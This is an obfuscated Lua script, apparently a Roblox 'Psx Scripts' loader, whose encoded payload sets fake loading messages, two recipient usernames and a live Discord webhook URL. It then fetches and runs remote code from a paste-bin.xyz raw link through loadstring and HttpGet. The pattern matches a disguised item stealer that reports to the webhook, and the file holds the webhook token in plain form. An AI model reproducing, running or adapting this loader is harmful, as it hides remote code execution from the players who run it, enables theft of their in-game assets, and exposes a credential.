--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v71=0;while true do if (v71==0) then v19=v0(v3(v30,1,1));return "";end end else local v72=0;local v73;while true do if (v72==0) then v73=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v73,v19);v19=nil;v98=1;end end else return v73;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v74=(v31/((5 -(1 + 2))^(v32-1)))%(2^(((v33-(2 -1)) -(v32-(1 -0))) + 1 + 0)) ;return v74-(v74%(2 -1)) ;else local v75=(621 -(555 + 64))^(v32-((1809 -(282 + 595)) -(857 + 74))) ;return (((v31%(v75 + v75))>=v75) and (569 -(367 + (1838 -(1523 + 114))))) or (927 -(214 + 713)) ;end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==(0 -(0 + 0))) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) ;v34=1 + 0 ;end if (v34==(1066 -(68 + 997))) then return v35;end end end local function v22()local v36=957 -(892 + 65) ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (3 -1) );v18=v18 + (3 -(1 + 0)) ;v36=1;end if (v36==(351 -(87 + 263))) then return (v38 * (436 -(67 + 113))) + v37 ;end end end local function v23()local v39=0 -0 ;local v40;local v41;local v42;local v43;while true do if ((0 + 0)==v39) then v40,v41,v42,v43=v1(v16,v18,v18 + (1000 -(915 + 82)) );v18=v18 + 4 ;v39=3 -2 ;end if (v39==(953 -(802 + 150))) then return (v43 * (45169940 -(80396151 -52003427))) + (v42 * (118879 -53343)) + (v41 * (109 + 78 + 69)) + v40 ;end end end local function v24()local v44=v23();local v45=v23();local v46=1 -0 ;local v47=(v20(v45,1188 -(1069 + 118) ,(1531 -(998 + 488)) -(8 + 17) ) * ((3 -1)^(6 + 26))) + v44 ;local v48=v20(v45,37 -16 ,31);local v49=((v20(v45,32 + 0 )==1) and  -((649 + 143) -(368 + (1195 -(201 + 571))))) or (3 -2) ;if (v48==0) then if (v47==0) then return v49 * 0 ;else v48=19 -(10 + 8) ;v46=0 -0 ;end elseif (v48==(2489 -(416 + 26))) then return ((v47==(0 -0)) and (v49 * ((1 + 0)/0))) or (v49 * NaN) ;end return v8(v49,v48-((2947 -(116 + 1022)) -786) ) * (v46 + (v47/((440 -(145 + 293))^(482 -(44 + 386))))) ;end local function v25(v50)local v51;if  not v50 then local v76=0 -0 ;while true do if (v76==(0 + (859 -(814 + 45)))) then v50=v23();if (v50==0) then return "";end break;end end end v51=v3(v16,v18,(v18 + v50) -(3 -2) );v18=v18 + v50 ;local v52={};for v69=3 -2 , #v51 do v52[v69]=v2(v1(v3(v51,v69,v69)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v53==4) then while true do if (v54==(6 -4)) then local v96=0 -0 ;while true do if (v96~=(0 -0)) then else v59=nil;v60=nil;v96=1825 -(1195 + 629) ;end if (v96~=1) then else v54=3 -0 ;break;end end end if (v54==3) then v61=nil;while true do local v100=0;while true do if (v100~=1) then else if (v55==(241 -(187 + 54))) then local v107=0;local v108;while true do if ((780 -(162 + 618))==v107) then v108=0 + 0 ;while true do if (v108==(0 + 0)) then local v138=0;while true do if (v138==1) then v108=1;break;end if (v138==0) then v56={};v57={};v138=1 -0 ;end end end if (v108~=2) then else v55=1 -0 ;break;end if (v108==1) then local v139=0 + 0 ;while true do if (0==v139) then v58={};v59={v56,v57,nil,v58};v139=1 + 0 ;end if (1~=v139) then else v108=2;break;end end end end break;end end end break;end if (v100==(0 -0)) then if (v55~=(2 -0)) then else local v109=0;local v110;while true do if (v109==(1384 -(746 + 638))) then v110=0 + 0 ;while true do local v113=0 -0 ;while true do if (v113~=(341 -(218 + 123))) then else if (v110~=0) then else local v179=1581 -(1535 + 46) ;local v180;while true do if (v179==(0 + 0)) then v180=0;while true do if (v180==1) then v110=1;break;end if ((0 + 0)~=v180) then else for v210=561 -(306 + 254) ,v23() do local v211=0 + 0 ;local v212;local v213;while true do if (v211==0) then local v216=0 -0 ;local v217;while true do if (v216==0) then v217=1467 -(899 + 568) ;while true do if (v217==0) then local v227=0;while true do if (v227~=1) then else v217=1 + 0 ;break;end if (0==v227) then v212=0;v213=nil;v227=2 -1 ;end end end if (v217==(604 -(268 + 335))) then v211=291 -(60 + 230) ;break;end end break;end end end if (1~=v211) then else while true do if (v212~=(572 -(426 + 146))) then else v213=v21();if (v20(v213,1 + 0 ,1)==(1456 -(282 + 1174))) then local v222=811 -(569 + 242) ;local v223;local v224;local v225;local v226;while true do if (v222==(0 -0)) then v223=0;v224=nil;v222=1;end if (1==v222) then v225=nil;v226=nil;v222=1 + 1 ;end if (v222==(1026 -(706 + 318))) then while true do if (v223~=0) then else local v228=0;while true do if (v228~=1) then else v223=1252 -(721 + 530) ;break;end if (v228~=0) then else v224=v20(v213,2,3);v225=v20(v213,4,6);v228=1;end end end if (v223==2) then if (v20(v225,1,1272 -(945 + 326) )~=1) then else v226[4 -2 ]=v61[v226[2]];end if (v20(v225,2 + 0 ,2)==(701 -(271 + 429))) then v226[3 + 0 ]=v61[v226[1503 -(1408 + 92) ]];end v223=3;end if (v223~=(1089 -(461 + 625))) then else if (v20(v225,1291 -(993 + 295) ,3)==1) then v226[1 + 3 ]=v61[v226[4]];end v56[v210]=v226;break;end if (v223~=(1172 -(418 + 753))) then else local v230=0;while true do if (v230==0) then local v237=0;while true do if (v237==(1 + 0)) then v230=1;break;end if (v237~=(0 + 0)) then else v226={v22(),v22(),nil,nil};if (v224==(529 -(406 + 123))) then local v238=1769 -(1749 + 20) ;local v239;while true do if (v238~=0) then else v239=0 + 0 ;while true do if (v239~=0) then else v226[3]=v22();v226[4]=v22();break;end end break;end end elseif (v224==(1323 -(1249 + 73))) then v226[2 + 1 ]=v23();elseif (v224==(1147 -(466 + 679))) then v226[6 -3 ]=v23() -(2^16) ;elseif (v224==3) then local v244=0 -0 ;local v245;while true do if (v244~=(1900 -(106 + 1794))) then else v245=0 + 0 ;while true do if (v245~=0) then else v226[1 + 2 ]=v23() -((5 -3)^(43 -27)) ;v226[4]=v22();break;end end break;end end end v237=1;end end end if (v230==(115 -(4 + 110))) then v223=2;break;end end end end break;end end end break;end end break;end end end for v214=585 -(57 + 527) ,v23() do v57[v214-1 ]=v28();end v180=1428 -(41 + 1386) ;end end break;end end end if (v110==1) then return v59;end break;end end end break;end end end if (v55~=1) then else local v111=103 -(17 + 86) ;while true do if (v111==0) then v60=v23();v61={};v111=1 + 0 ;end if (1~=v111) then else local v112=0 -0 ;while true do if ((0 -0)~=v112) then else for v160=167 -(122 + 44) ,v60 do local v161=0 -0 ;local v162;local v163;local v164;local v165;local v166;while true do if (v161==2) then v166=nil;while true do if (v162==0) then v163=0 -0 ;v164=nil;v162=1;end if (2==v162) then while true do if (v163==1) then v166=nil;while true do if (v164~=0) then else local v218=0 + 0 ;local v219;local v220;while true do if (v218==(1 + 0)) then while true do if (0==v219) then v220=0 -0 ;while true do if (v220~=0) then else v165=v21();v166=nil;v220=66 -(30 + 35) ;end if ((1 + 0)==v220) then v164=1;break;end end break;end end break;end if (v218==0) then v219=1257 -(1043 + 214) ;v220=nil;v218=1;end end end if (v164==1) then if (v165==1) then v166=v21()~=0 ;elseif (v165==(7 -5)) then v166=v24();elseif (v165~=(1215 -(323 + 889))) then else v166=v25();end v61[v160]=v166;break;end end break;end if (v163==(0 -0)) then v164=0;v165=nil;v163=581 -(361 + 219) ;end end break;end if (v162==1) then local v209=320 -(53 + 267) ;while true do if (v209==(1 + 0)) then v162=415 -(15 + 398) ;break;end if (v209==(982 -(18 + 964))) then v165=nil;v166=nil;v209=3 -2 ;end end end end break;end if (v161~=(1 + 0)) then else v164=nil;v165=nil;v161=2 + 0 ;end if (v161==0) then v162=0;v163=nil;v161=1;end end end v59[3]=v21();v112=1;end if (1==v112) then v111=2;break;end end end if (v111==2) then v55=852 -(20 + 830) ;break;end end end v100=1 + 0 ;end end end break;end if (v54~=(126 -(116 + 10))) then else v55=0;v56=nil;v54=1 + 0 ;end if (v54==(739 -(542 + 196))) then local v97=0 -0 ;while true do if (v97==(0 + 0)) then v57=nil;v58=nil;v97=1 + 0 ;end if (v97==1) then v54=2;break;end end end end break;end if (v53==(1 + 0)) then v56=nil;v57=nil;v53=4 -2 ;end if (v53==(7 -4)) then v60=nil;v61=nil;v53=1555 -(1126 + 425) ;end if (v53==(405 -(118 + 287))) then v54=0 -0 ;v55=nil;v53=1122 -(118 + 1003) ;end if (v53~=2) then else v58=nil;v59=nil;v53=8 -5 ;end end end local function v29(v62,v63,v64)local v65=0;local v66;local v67;local v68;while true do if (v65==1) then v68=v62[3];return function(...)local v80=v66;local v81=v67;local v82=v68;local v83=v27;local v84=1;local v85= -1;local v86={};local v87={...};local v88=v12("#",...) -1 ;local v89={};local v90={};for v94=0,v88 do if (v94>=v82) then v86[v94-v82 ]=v87[v94 + 1 ];else v90[v94]=v87[v94 + 1 ];end end local v91=(v88-v82) + 1 ;local v92;local v93;while true do local v95=0;while true do if (v95==0) then v92=v80[v84];v93=v92[1];v95=1;end if (v95==1) then if (v93<=8) then if (v93<=3) then if (v93<=1) then if (v93==0) then local v114=v92[2];v90[v114]=v90[v114](v13(v90,v114 + 1 ,v85));else local v116=0;while true do if (v116==0) then v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v64[v92[3]];v116=1;end if (v116==2) then v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v116=3;end if (v116==3) then v84=v92[3];break;end if (v116==1) then v84=v84 + 1 ;v92=v80[v84];v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v116=2;end end end elseif (v93==2) then do return;end else v64[v92[3]]=v90[v92[2]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v64[v92[3]]=v90[v92[2]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v84=v92[3];end elseif (v93<=5) then if (v93==4) then v90[v92[2]]=v64[v92[3]];else v90[v92[2]]=v92[3];end elseif (v93<=6) then v90[v92[2]]();elseif (v93>7) then v64[v92[3]]=v90[v92[2]];else local v143=0;local v144;local v145;while true do if (v143==0) then v144=v92[2];v145=v90[v92[3]];v143=1;end if (v143==1) then v90[v144 + 1 ]=v145;v90[v144]=v145[v92[4]];break;end end end elseif (v93<=12) then if (v93<=10) then if (v93>9) then local v125=v92[2];local v126,v127=v83(v90[v125](v13(v90,v125 + 1 ,v92[3])));v85=(v127 + v125) -1 ;local v128=0;for v133=v125,v85 do v128=v128 + 1 ;v90[v133]=v126[v128];end else v84=v92[3];end elseif (v93==11) then v90[v92[2]]=v92[3]~=0 ;else v90[v92[2]][v92[3]]=v92[4];end elseif (v93<=14) then if (v93==13) then if (v92[2]==v90[v92[4]]) then v84=v84 + 1 ;else v84=v92[3];end else for v136=v92[2],v92[3] do v90[v136]=nil;end end elseif (v93<=15) then if (v90[v92[2]]==v92[4]) then v84=v84 + 1 ;else v84=v92[3];end elseif (v93==16) then v64[v92[3]]=v90[v92[2]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v64[v92[3]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v84=v92[3];else local v154=0;local v155;local v156;local v157;local v158;local v159;while true do if (v154==0) then v155=nil;v156,v157=nil;v158=nil;v159=nil;v154=1;end if (5==v154) then v156,v157=v83(v90[v159](v13(v90,v159 + 1 ,v92[3])));v85=(v157 + v159) -1 ;v155=0;for v206=v159,v85 do v155=v155 + 1 ;v90[v206]=v156[v155];end v154=6;end if (v154==3) then v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v154=4;end if (v154==1) then v90[v92[2]]=v64[v92[3]];v84=v84 + 1 ;v92=v80[v84];v159=v92[2];v154=2;end if (6==v154) then v84=v84 + 1 ;v92=v80[v84];v159=v92[2];v90[v159]=v90[v159](v13(v90,v159 + 1 ,v85));v154=7;end if (7==v154) then v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]();v84=v84 + 1 ;v154=8;end if (8==v154) then v92=v80[v84];v84=v92[3];break;end if (v154==2) then v158=v90[v92[3]];v90[v159 + 1 ]=v158;v90[v159]=v158[v92[4]];v84=v84 + 1 ;v154=3;end if (v154==4) then v90[v92[2]]=v92[3]~=0 ;v84=v84 + 1 ;v92=v80[v84];v159=v92[2];v154=5;end end end v84=v84 + 1 ;break;end end end end;end if (v65==0) then v66=v62[1];v67=v62[2];v65=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!1A3O00028O00026O000840026O00F03F026O00104003023O005F4703093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E030B3O0057616974696E6754696D65025O00C07240030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F70617374652D62696E2E78797A2F7261772F39382O342O3603083O00557365724E616D65030A3O005350454C454D454E5F3503093O00557365724E616D653203073O0057652O6C445F32027O004003093O00466972737454657874030D3O00506C6561736520776169742O2E030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F5O313734332O323732343238363438342F5A79617635714A46624458374D706D7965474E346554636F766D54517564307953736471765266465459486B69424E4D47584D6A465A763435547051695038776C66594E030A3O005363726970744E616D65030B3O00507378205363726970747300483O0012053O00014O000E000100013O000E0D0001000200013O0004093O00020001001205000100013O00260F00010014000100020004093O00140001001205000200013O00260F0002000C000100030004093O000C0001001205000100043O0004093O0014000100260F00020008000100010004093O00080001001204000300053O00300100030006000700122O000300053O00302O00030008000900122O000200033O00044O0008000100260F0001001F000100040004093O001F00010012040002000A3O0012110003000B3O00202O00030003000C00122O0005000D6O000600016O000300066O00023O00024O00020001000100044O0047000100260F0001002E000100010004093O002E0001001205000200013O00260F00020026000100030004093O00260001001205000100033O0004093O002E0001000E0D00010022000100020004093O002200010012050003000F3O0012030003000E3O00122O000300113O00122O000300103O00122O000200033O00044O0022000100260F00010035000100120004093O00350001001204000200053O00300C000200130014001204000200053O00300C000200150016001205000100023O00260F00010005000100030004093O00050001001205000200013O00260F0002003C000100030004093O003C0001001205000100123O0004093O0005000100260F00020038000100010004093O00380001001205000300183O001210000300173O00122O000300053O00302O00030019001A00122O000200033O00044O003800010004093O000500010004093O004700010004093O000200012O00023O00017O00",v9(),...);end
